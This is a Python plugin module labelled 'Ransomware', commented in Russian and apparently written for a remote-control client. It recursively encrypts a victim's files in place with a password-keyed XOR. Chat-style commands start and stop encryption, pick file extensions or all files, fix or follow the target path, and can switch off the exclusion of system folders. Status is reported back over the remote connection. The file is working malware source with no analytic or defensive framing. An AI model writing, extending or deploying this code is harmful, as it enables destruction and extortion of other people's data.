# NAME: Ransomware
# DESC: Шифрование данных (XOR). Помощь: `/lock_help`

# --- КОНФИГУРАЦИЯ ---
CFG = {
    "ext": ['.txt', '.jpg', '.png', '.docx', '.xlsx', '.pdf', '.zip'],
    "all_files": False,
    "path": None, 
    "max_size_mb": 100,
    "exclude_sys": True
}

STOP_FLAG = False

def get_actual_client_path():
    """Вытаскивает текущий путь из основного ядра клиента"""
    target = globals().get('current_path')
    if not target:
        try:
            import __main__
            target = getattr(__main__, 'current_path', os.getcwd())
        except:
            target = os.getcwd()
    return target

def get_target_path():
    """Возвращает либо жестко заданный путь, либо динамический"""
    if CFG["path"]:
        return CFG["path"]
    return get_actual_client_path()

def format_bytes(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024: return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} TB"

# --- ЯДРО ---

def process_logic(key, conn, decrypt=False):
    global STOP_FLAG
    STOP_FLAG = False
    
    target_dir = get_target_path()
    sys_dirs = ['windows', 'program files', 'appdata']
    mode_str = "`ALL FILES (*)`" if CFG["all_files"] else f"`EXT: {', '.join(CFG['ext'])}`"
    
    # Экранируем путь для Markdown
    safe_path = str(target_dir).replace('\\', '\\\\')
    
    send_response(conn, 
        f"💎 *LOCKER START*\n"
        f"📂 `Target:` `{safe_path}`\n"
        f"📑 `Mode:` {mode_str}\n"
        f"⚖️ `Limit:` {CFG['max_size_mb']} MB\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    count = 0
    total_size = 0
    
    try:
        for root, dirs, files in os.walk(target_dir):
            if STOP_FLAG: break
            if CFG["exclude_sys"] and any(s in root.lower() for s in sys_dirs):
                continue

            for file in files:
                if STOP_FLAG: break
                is_target = CFG["all_files"] or file.lower().endswith(tuple(CFG['ext']))
                if not is_target: continue

                file_path = os.path.join(root, file)
                try:
                    f_size = os.path.getsize(file_path)
                    if f_size > (CFG['max_size_mb'] * 1024 * 1024): continue

                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    # Используем XOR_cipher, который внедрил клиент
                    processed = XOR_cipher(data, key)
                    
                    with open(file_path, 'wb') as f:
                        f.write(processed)
                    
                    count += 1
                    total_size += f_size
                except: continue

        status = "РАСШИФРОВАНО" if decrypt else "ЗАШИФРОВАНО"
        send_response(conn, 
            f"✅ *ГОТОВО*\n"
            f"📊 Объектов: {count}\n"
            f"📦 Объем: {format_bytes(total_size)}\n"
            f"🔑 Статус: {status}"
        )
    except Exception as e:
        send_response(conn, f"❌ Error: {str(e)}")

# --- КОМАНДЫ ---

def cmd_lock_set(args, conn=None):
    if not args:
        current = str(get_target_path()).replace('\\', '\\\\')
        ext_view = "*" if CFG["all_files"] else ", ".join(CFG["ext"])
        return (
            "```yaml\n"
            "--- [ LOCKER CONFIG ] ---\n"
            f"Target_Path: \"{current}\"\n"
            f"Extensions:  {ext_view}\n"
            f"Max_Size:    {CFG['max_size_mb']} MB\n"
            f"Safe_Mode:   {'ON' if CFG['exclude_sys'] else 'OFF'}\n"
            "```"
        )

    parts = args.split(maxsplit=1)
    if len(parts) < 2: return "⚠️ Ошибка. См. /lock_help"
    
    key, val = parts[0].lower(), parts[1].strip()

    if key == "ext":
        if val == "*":
            CFG["all_files"] = True
            return "⚙️ Режим: *ВСЕ ФАЙЛЫ*"
        else:
            CFG["all_files"] = False
            CFG["ext"] = [f".{x.strip().replace('.', '')}" for x in val.replace(',', ' ').split() if x.strip()]
            return f"⚙️ Расширения: `{', '.join(CFG['ext'])}`"

    elif key == "size":
        try:
            CFG["max_size_mb"] = int(val)
            return f"⚖️ Лимит: *{val} MB*"
        except: return "❌ Ошибка числа."

    elif key == "path":
        if val.lower() == "auto":
            CFG["path"] = None
            return "📍 Путь: *DYNAMIC*"
        if os.path.exists(val):
            CFG["path"] = val
            return f"📍 Путь зафиксирован: `{val}`"
        return "❌ Путь не найден."

    elif key == "safe":
        CFG["exclude_sys"] = (val.lower() == "on")
        return f"🛡 Safe Mode: *{val.upper()}*"

    return "❓ Неизвестный параметр."

def cmd_lock(args, conn):
    if not args: return "⚠️ Пароль?"
    threading.Thread(target=process_logic, args=(args.strip(), conn, False), daemon=True).start()
    return "🚀 Запуск шифрования..."

def cmd_unlock(args, conn):
    if not args: return "⚠️ Пароль?"
    threading.Thread(target=process_logic, args=(args.strip(), conn, True), daemon=True).start()
    return "🔓 Запуск расшифровки..."

def cmd_lock_help(args, conn=None):
    return (
        "```yaml\n"
        "--- [ LOCKER HELP ] ---\n"
        "/lock_set ext * | Шифровать все\n"
        "/lock_set ext doc txt    | Только типы\n"
        "/lock_set path auto      | Следовать за /cd\n"
        "/lock_set path C:\\\\      | Жесткий путь\n"
        "/lock_set size 100       | Лимит в МБ\n"
        "/lock_set                | Открытие конфига\n"
        "/lock_set safe off       | Выкл. защиту системных папок\n\n"
        "Команды: /lock <pass>, /unlock <pass>, /lock_stop\n"
        "```"
    )

PLUGINS = {
    "/lock": cmd_lock,
    "/unlock": cmd_unlock,
    "/lock_set": cmd_lock_set,
    "/lock_help": cmd_lock_help,
    "/lock_stop": lambda a, c: globals().update(STOP_FLAG=True) or "🛑 STOP SIGNAL SENT"
}
